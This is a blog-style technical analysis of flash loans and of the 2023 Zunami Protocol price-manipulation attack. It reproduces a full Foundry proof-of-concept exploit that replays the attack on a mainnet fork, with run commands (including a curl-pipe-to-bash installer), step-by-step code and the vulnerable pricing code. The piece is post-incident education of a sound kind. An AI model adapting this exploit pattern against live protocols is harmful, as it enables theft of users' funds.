---
type: post
title: Exploring the Mechanics of Flash Loan Exploits with a Real-World Case Study
image: /pics/hackmd.io/r1_fmpglR.png
date: 2024-04-08
category: Advanced
tags:
  - flash loan
---


Following our previous article on the [flash loan attack case study in the Themis protocol](https://smartcontract.tips/articoli/oracolo-malfunzionante-attacco-di-flashloan-al-protocollo-themis/), this article will provide an in-depth and hands-on examination of a flash loan exploit. Our goal is to thoroughly unpack the workings and consequences of such incidents.

## Flash loans
Introduced initially by Marble in 2018 and popularized by Aave blockchain in 2020, flash loans have revolutionized the DeFi sector. Flash loans enable users to borrow vast sums of assets without needing collateral, provided they repay the loan within the same blockchain transaction. Although this concept may seem fraught with risk, the design of flash loans guarantees that the transaction is reversed if the loan is not repaid in time, ensuring no loss of funds.

This groundbreaking feature has paved the way for new financial maneuvers in the DeFi ecosystem, such as arbitrage and collateral swaps. The advent of flash loans highlights the adaptability of decentralized finance and poses a significant challenge to conventional lending and borrowing practices.

![flashlons](/pics/hackmd.io/HJ-nunggC.png)


 Flash loans are a type of uncollateralized loan option in the cryptocurrency space that allows you to borrow assets instantly and without collateral, with the condition that the loan must be paid back within the same transaction block. If the loan is not repaid within the same transaction, the entire transaction is reversed to effectively undo the actions executed until that point. Here's a breakdown of the steps shown in the figure:

1. **Transfer Loan:** The flash loan provider transfers the loan amount to the user. This is the initial step where the user receives the funds they wish to borrow.

2. **Invoke:** The user invokes the transaction or operations they wish to perform with the borrowed funds. This typically involves calling a function in a smart contract.

3. **Execute:** The user executes the intended operations with the borrowed funds. Common uses of flash loans include arbitrage (taking advantage of price differences between exchanges), liquidation (paying off debt in order to release collateral), and collateral swap (exchanging one type of collateral for another in a financial operation).

4. **Payback Loan:** After executing the intended operations, the user pays back the loan amount to the flash loan provider. This step is crucial and must be done in the same transaction block; otherwise, the transaction fails.

5. **Check State:** Finally, the flash loan provider checks the state of the loan. This typically involves ensuring that the loan has been paid back with any required fees.


The code snippet below illustrates the integration of a flash loan into our smart contract via the Aave platform.


```c
// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "https://github.com/aave/aave-v3-core/blob/master/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";
import "https://github.com/aave/aave-v3-core/blob/master/contracts/interfaces/IPoolAddressesProvider.sol";
import "https://github.com/aave/aave-v3-core/blob/master/contracts/dependencies/openzeppelin/contracts/IERC20.sol";

contract QuickFlashLoanExample is FlashLoanSimpleReceiverBase {
    address payable contractOwner;

    constructor(address providerAddress)
        FlashLoanSimpleReceiverBase(IPoolAddressesProvider(providerAddress))
    {
    }

    function initiateFlashLoan(address assetAddress, uint256 loanAmount) public {
        address selfAddress = address(this);
        address currency = assetAddress;
        uint256 value = loanAmount;
        bytes memory operationData = "";
        uint16 referral = 0;

        POOL.flashLoanSimple(
            selfAddress,
            currency,
            value,
            operationData,
            referral
        );
    }
    
    // Callback function after receiving the flash loan

    function executeOperation(
        address currency,
        uint256 borrowedAmount,
        uint256 feeAmount,
        address sender,
        bytes calldata operationParameters
    ) external override returns (bool) {
        
        // Your custom logic here
        
        uint256 repaymentAmount = borrowedAmount + feeAmount;
        IERC20(currency).approve(address(POOL), repaymentAmount);

        return true;
    }

    receive() external payable {}
}

```

## The Advent of Flash Loan Exploits

The introduction of flash loans to the DeFi ecosystem served as a double-edged sword. While enabling new financial strategies like arbitrage, it also opened the floodgates to a series of sophisticated exploits. Notable examples of such security breaches include:

- The OUSD platform suffering a $7.9 million theft.
- Value DeFi facing over $6 million in losses.
- Cheese Bank being hit with a $3 million fraud.

These incidents underscore the security challenges within the DeFi sector, underlining the urgent need for enhanced protective measures and increased alertness among platforms. As DeFi continues to evolve, the catalog of such exploits unfortunately expands alongside it.

## Zunami Protocol Attack : In-Depth Analysis

We will examine the breach of the Zunami Protocol, which saw more than $2 million stolen via a flash loan exploit. This article aims to dissect the mechanics behind this particular attack in detail.

### Resource Hub for DeFi Security "DefiHackLabs"

https://github.com/SunWeb3Sec/DeFiHackLabs![image](/pics/hackmd.io/SyMPingeR.png)


DeFiHackLabs serves as a comprehensive GitHub repository, curated by the security research team SunWeb3Sec, focusing on the DeFi space. This resource offers a trove of tools and information designed to aid in the understanding and investigation of DeFi hacks. The repository boasts code for recreating 269 DeFi hacking events, alongside transaction analysis tools, Ethereum signature catalogues, and more valuable resources. Aimed solely at educational and preventative applications, DeFiHackLabs is a pivotal asset for anyone looking to safeguard against or understand DeFi security breaches.

### Proof of Concept Examination

Following is the PoC (Proof of Concept), demonstrating a test case that lays bare the vulnerability exploited in the Zunami attack. We will explore the technical specifics of this case in subsequent sections.

``` c

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~2M USD$
// Attacker : https://etherscan.io/address/0x5f4c21c9bb73c8b4a296cc256c0cde324db146df
// Attack Contract : https://etherscan.io/address/0xa21a2b59d80dc42d332f778cbb9ea127100e5d75
// Vulnerable Contract : https://etherscan.io/address/0xb40b6608b2743e691c9b54ddbdee7bf03cd79f1c
// Attack Tx : https://etherscan.io/tx/0x0788ba222970c7c68a738b0e08fb197e669e61f9b226ceec4cab9b85abe8cceb

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xb40b6608b2743e691c9b54ddbdee7bf03cd79f1c#code

// @Analysis
// Post-mortem : https://www.google.com/
// Twitter Guy : https://twitter.com/peckshield/status/1690877589005778945
// Twitter Guy : https://twitter.com/BlockSecTeam/status/1690931111776358400
// Hacking God : https://www.google.com/

interface IUZD is IERC20 {
    function cacheAssetPrice() external;
}

interface ICurve {
    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 min_dy,
        bool use_eth,
        address receiver
    ) external returns (uint256);
}

contract ContractTest is Test {
    IUZD UZD = IUZD(0xb40b6608B2743E691C9B54DdBDEe7bf03cd79f1c);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 crvUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IERC20 crvFRAX = IERC20(0x3175Df0976dFA876431C2E9eE6Bc45b65d3473CC);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 SDT = IERC20(0x73968b9a57c6E53d41345FD57a6E6ae27d6CDB2F);
    IERC20 FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);
    ICurvePool FRAX_USDC_POOL = ICurvePool(0xDcEF968d416a41Cdac0ED8702fAC8128A64241A2);
    ICurvePool UZD_crvFRAX_POOL = ICurvePool(0x68934F60758243eafAf4D2cFeD27BF8010bede3a);
    ICurvePool crvUSD_USDC_POOL = ICurvePool(0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E);
    ICurvePool crvUSD_UZD_POOL = ICurvePool(0xfC636D819d1a98433402eC9dEC633d864014F28C);
    ICurvePool Curve3POOL = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICurve ETH_SDT_POOL = ICurve(0xfB8814D005C5f32874391e888da6eB2fE7a27902);
    Uni_Router_V2 sushiRouter = Uni_Router_V2(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    Uni_Pair_V3 USDC_WETH_Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    Uni_Pair_V3 USDC_USDT_Pair = Uni_Pair_V3(0x3416cF6C708Da44DB2624D63ea0AAef7113527C6);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address MIMCurveStakeDao = 0x9848EDb097Bee96459dFf7609fb582b80A8F8EfD;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_908_949);
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(UZD), "UZD");
        vm.label(address(crvUSD), "crvUSD");
        vm.label(address(crvFRAX), "crvFRAX");
        vm.label(address(USDT), "USDT");
        vm.label(address(FRAX), "FRAX");
        vm.label(address(FRAX_USDC_POOL), "FRAX_USDC_POOL");
        vm.label(address(UZD_crvFRAX_POOL), "UZD_crvFRAX_POOL");
        vm.label(address(crvUSD_USDC_POOL), "crvUSD_USDC_POOL");
        vm.label(address(crvUSD_UZD_POOL), "crvUSD_UZD_POOL");
        vm.label(address(Curve3POOL), "Curve3POOL");
        vm.label(address(ETH_SDT_POOL), "ETH_SDT_POOL");
        vm.label(address(sushiRouter), "sushiRouter");
        vm.label(address(USDC_WETH_Pair), "USDC_WETH_Pair");
        vm.label(address(USDC_USDT_Pair), "USDC_USDT_Pair");
        vm.label(address(Balancer), "Balancer");
        vm.label(address(MIMCurveStakeDao), "MIMCurveStakeDao");
    }

    function testExploit() external {
        USDC_USDT_Pair.flash(address(this), 0, 7_000_000 * 1e6, abi.encode(7_000_000 * 1e6));

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );

        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
        );
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        BalancerFlashLoan();

        uint256 amount = abi.decode(data, (uint256));
        TransferHelper.safeTransfer(address(USDT), address(USDC_USDT_Pair), amount1 + amount);
    }

    function BalancerFlashLoan() internal {
        address[] memory tokens = new address[](2);
        tokens[0] = address(USDC);
        tokens[1] = address(WETH);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 7_000_000 * 1e6;
        amounts[1] = 10_011 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);
    }

    // balancer flashloan callback
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        apporveAll();

        uint256[2] memory amount;
        amount[0] = 0;
        amount[1] = 5_750_000 * 1e6;
        uint256 crvFRAXBalance = FRAX_USDC_POOL.add_liquidity(amount, 0); // mint crvFRAX

        UZD_crvFRAX_POOL.exchange(1, 0, crvFRAXBalance, 0, address(this)); // swap crvFRAX to UZD

        crvUSD_USDC_POOL.exchange(0, 1, 1_250_000 * 1e6, 0, address(this)); // swap USDC to crvUSD

        crvUSD_UZD_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this)); // swap crvUSD to UZD

        ETH_SDT_POOL.exchange(0, 1, 11 ether, 0, false, address(this)); // swap WETH to SDT

        // @Vulnerability Code:
        // UZD balanceOf return value is manipulated by the following values
        // uint256 amountIn = sdtEarned + _config.sdt.balanceOf(address(this)); -> get SDT amount in MIMCurveStakeDao
        // uint256 sdtEarningsInFeeToken = priceTokenByExchange(amountIn, _config.sdtToFeeTokenPath); -> sushi router.getAmountsOut(amountIn, exchangePath); path: SDT -> WETH -> USDT
        emit log_named_decimal_uint(
            "Before donation and reserve manipulation, UZD balance", UZD.balanceOf(address(this)), WETH.decimals()
        );
        SDT.transfer(MIMCurveStakeDao, SDT.balanceOf(address(this))); // donate SDT to MIMCurveStakeDao, inflate UZD balance

        swapToken1Totoken2(WETH, SDT, 10_000 ether); // swap WETH to SDT by sushi router
        uint256 value = swapToken1Totoken2(USDT, WETH, 7_000_000 * 1e6); // swap USDT to WETH by sushi router

        UZD.cacheAssetPrice(); // rebase UZD balance

        emit log_named_decimal_uint(
            "After donation and reserve manipulation, UZD balance", UZD.balanceOf(address(this)), WETH.decimals()
        );

        swapToken1Totoken2(SDT, WETH, SDT.balanceOf(address(this))); // swap SDT to WETH
        swapToken1Totoken2(WETH, USDT, value); // swap WETH to USDT

        UZD_crvFRAX_POOL.exchange(0, 1, UZD.balanceOf(address(this)) * 84 / 100, 0, address(this)); // swap UZD to crvFRAX

        crvUSD_UZD_POOL.exchange(0, 1, UZD.balanceOf(address(this)), 0, address(this)); // swap UZD to crvUSD

        FRAX_USDC_POOL.remove_liquidity(crvFRAX.balanceOf(address(this)), [uint256(0), uint256(0)]); // burn crvFRAX

        FRAX_USDC_POOL.exchange(0, 1, FRAX.balanceOf(address(this)), 0); // swap FRAX to USDC

        crvUSD_USDC_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this)); // swap crvUSD to USDC

        Curve3POOL.exchange(1, 2, 25_920 * 1e6, 0); // swap USDC to USDT

        uint256 swapAmount = USDC.balanceOf(address(this)) - amounts[0];
        USDC_WETH_Pair.swap(address(this), true, int256(swapAmount), 920_316_691_481_336_325_637_286_800_581_326, ""); // swap USDC to WETH

        IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);
        IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]);
    }

    function apporveAll() internal {
        USDC.approve(address(FRAX_USDC_POOL), type(uint256).max);
        crvFRAX.approve(address(UZD_crvFRAX_POOL), type(uint256).max);
        UZD.approve(address(UZD_crvFRAX_POOL), type(uint256).max);
        USDC.approve(address(crvUSD_USDC_POOL), type(uint256).max);
        crvUSD.approve(address(crvUSD_USDC_POOL), type(uint256).max);
        crvUSD.approve(address(crvUSD_UZD_POOL), type(uint256).max);
        UZD.approve(address(crvUSD_UZD_POOL), type(uint256).max);
        WETH.approve(address(ETH_SDT_POOL), type(uint256).max);
        USDC.approve(address(Curve3POOL), type(uint256).max);
        USDC.approve(address(USDC_WETH_Pair), type(uint256).max);
        WETH.approve(address(sushiRouter), type(uint256).max);
        SDT.approve(address(sushiRouter), type(uint256).max);
        TransferHelper.safeApprove(address(USDT), address(sushiRouter), type(uint256).max);
        FRAX.approve(address(FRAX_USDC_POOL), type(uint256).max);
    }

    function swapToken1Totoken2(IERC20 token1, IERC20 token2, uint256 amountIn) internal returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(token1);
        path[1] = address(token2);
        uint256[] memory values =
            sushiRouter.swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
        return values[1];
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        USDC.transfer(msg.sender, uint256(amount0Delta));
    }
}
```

![image](/pics/hackmd.io/HycbnnlgA.png)
https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/past/2023/README.md#20230814-zunamiprotocol---price-manipulation
### Setup and run:
``` bash
curl -L https://foundry.paradigm.xyz | bash
git clone git@github.com:SunWeb3Sec/DeFiHackLabs.git
cd DeFiHackLabs
```
``` bash
forge test --contracts ./src/test/Zunami_exp.sol --evm-version 'shanghai' -vvv
```

1. Secure a loan comprising 7,000,000 USDT from UniswapV3, alongside 7,000,000 USDC and 10,011 WETH from Balancer. (`uniswapV3FlashCallback` and `BalancerFlashLoan` functions from ContractTest smart contract)
2. Deposit 5,750,000 USDC to add liquidity in Curve Finance and mint approximately 5,746,896 GrvFRAX. Then, swap about 5,746,896 GrvFRAX for approximately 4,082,046 UZD, and swap 1,250,000 USDC for around 791,280 UZD on Curve.
``` solidity
uint256[2] memory amount;
amount[0] = 0;
amount[1] = 5_750_000 * 1e6;
// mint crvFRAX
uint256 crvFRAXBalance = FRAX_USDC_POOL.add_liquidity(amount, 0);
// swap crvFRAX to UZD
UZD_crvFRAX_POOL.exchange(1, 0, crvFRAXBalance, 0, address(this)); 
// swap USDC to crvUSD
crvUSD_USDC_POOL.exchange(0, 1, 1_250_000 * 1e6, 0, address(this)); 
```
3.  Engage in price manipulation by swapping 11 WETH for approximately 55,981 ST on Curve. Following this, contribute all 55,598 SDT obtained from the swap to the MIMCurveStakeDao as a donation.

``` solidity
// swap WETH to SDT
ETH_SDT_POOL.exchange(0, 1, 11 ether, 0, false, address(this)); 
// donate SDT to MIMCurveStakeDao, inflate UZD balance
SDT.transfer(MIMCurveStakeDao, SDT.balanceOf(address(this)));
```

4. Continue price manipulation by exchanging 10,000 WETH for approximately 58,043 SDT and converting 7,000,000 USDT into about 2,154 WETH on SushiSwap.

``` solidity 
// swap WETH to SDT by sushi router
swapToken1Totoken2(WETH, SDT, 10_000 ether);
// swap USDT to WETH by sushi router
uint256 value = swapToken1Totoken2(USDT, WETH, 7_000_000 * 1e6);
```
5.  Utilize the `cachessetPrice` function to capture and store the current price snapshot in UZD, effectively caching the market rates at this moment.

### Vulnerable Code
Let's examine the code that presents vulnerabilities:

``` solidity
function cacheAssetPrice() public virtual {
    _blockCached = block.number;
    uint256 currentAssetPrice = assetPrice();
    if (_assetPriceCached < currentAssetPrice) {
        _assetPriceCached = currentAssetPrice;
        emit CachedAssetPrice(_blockCached, _assetPriceCached);
    }
}

function assetPrice() public view override returns (uint256) {
    return priceOracle.lpPrice();
}

// priceOracle defined in the constructor
constructor(address priceOracle_) {
    _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);

    require(priceOracle_ != address(0), 'Zero price oracle');
    priceOracle = IAssetPriceOracle(priceOracle_);

    cacheAssetPrice();
}
```
 The focal point of our examination is the address of the priceOracle, particularly how the ZunamiElasticRigidVault is both initiated and utilized. Within this setup, the UZD contract inherits from the ZunamiElasticRigidVault, highlighting a specific constant address, `ZUNAMI`, which is pivotal to the contract's functionality. 

The construction of the UZD contract employs this `ZUNAMI` address to initiate its base properties, encapsulating the essence of the ZunamiElasticRigidVault's design and functionality. 

Our attention then shifts to the `lpPrice` function associated with the priceOracle located at the address `0x2ffCC661011beC72e1A9524E12060983E74D14ce`. This function is crucial for determining the price based on user income, specifically calculating the price of ZLP by considering the total holdings across all pools against the total supply.

The mechanism for calculating total holdings is particularly noteworthy. It aggregates the holdings from all pools, summing up the contributions from various strategies to arrive at a total holding value in USD. This comprehensive approach ensures a dynamic and reflective pricing model that adapts to the total assets managed by the pools.

When an attacker manipulates the system by donating to the MIMCurveStakeDao, an inflation in the UZD price occurs. This inflation is pivotal because the `balanceOf` function in the UZD contract, which calculates the attacker's balance, relies on this inflated price cached by the system. As a result, the balance of the attacker is artificially increased, exploiting the vulnerability tied to the reliance on an incorrect price in the cache.

6. To undo the price manipulation of UZD and capitalize on the inflated values, proceed to reverse all previously executed transactions that influenced UZD's price. After reverting these actions to their original state, exchange all inflated UZD holdings for a profit, completing the exploit cycle.

``` c
// swap SDT to WETH
swapToken1Totoken2(SDT, WETH, SDT.balanceOf(address(this)));
// swap WETH to USDT
swapToken1Totoken2(WETH, USDT, value);
// swap UZD to crvFRAX
UZD_crvFRAX_POOL.exchange(0, 1, UZD.balanceOf(address(this)) * 84 / 100, 0, address(this));
// swap UZD to crvUSD
crvUSD_UZD_POOL.exchange(0, 1, UZD.balanceOf(address(this)), 0, address(this)); 
// burn crvFRAX
FRAX_USDC_POOL.remove_liquidity(crvFRAX.balanceOf(address(this)), [uint256(0), uint256(0)]); 
// swap FRAX to USDC
FRAX_USDC_POOL.exchange(0, 1, FRAX.balanceOf(address(this)), 0); 
// swap crvUSD to USDC
crvUSD_USDC_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this)); 
// swap USDC to USDT
Curve3POOL.exchange(1, 2, 25_920 * 1e6, 0); 

uint256 swapAmount = USDC.balanceOf(address(this)) - amounts[0];
USDC_WETH_Pair.swap(address(this), true, int256(swapAmount), 920_316_691_481_336_325_637_286_800_581_326, ""); // swap USDC to WETH

IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);
IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]);
```
## Summary and Conclusion
The Zunami protocol suffered a Price Manipulation attack, causing a loss exceeding $2.1 million. The exploit unfolded across two key transactions:

1. [Transaction 1 on Etherscan](https://etherscan.io/tx/0x2aec4fdb2a09ad4269a410f2c770737626fb62c54e0fa8ac25e8582d4b690cca)
 ![image](/pics/hackmd.io/ByJkfplxR.png)

3. [Transaction 2 on Etherscan](https://etherscan.io/tx/0x0788ba222970c7c68a738b0e08fb197e669e61f9b226ceec4cab9b85abe8cceb)
![image](/pics/hackmd.io/BkYefTgeR.png)


The crux of the attack lay in a bug with the LP price computation in the totalHoldings function of strategies, particularly MIMCurveStakeDao, where the attacker boosted sdt and sdtPrice to skew price calculations.

The latter transaction proved particularly lucrative, netting around 1152 ETH in profits. Post-exploit, the illicit proceeds were laundered via TornadoCash, accompanied by an unspecified encrypted hash linked to the attack.


A recent Price Manipulation exploit targeted the Zunami Protocol, resulting in financial losses upwards of $2 million. By manipulating LP price calculations and leveraging flash loans, the assailant executed a sophisticated scheme to inflate asset prices and extract substantial earnings. This event highlights persistent security challenges within DeFi, emphasizing the critical need for advanced protective frameworks and ongoing vigilance.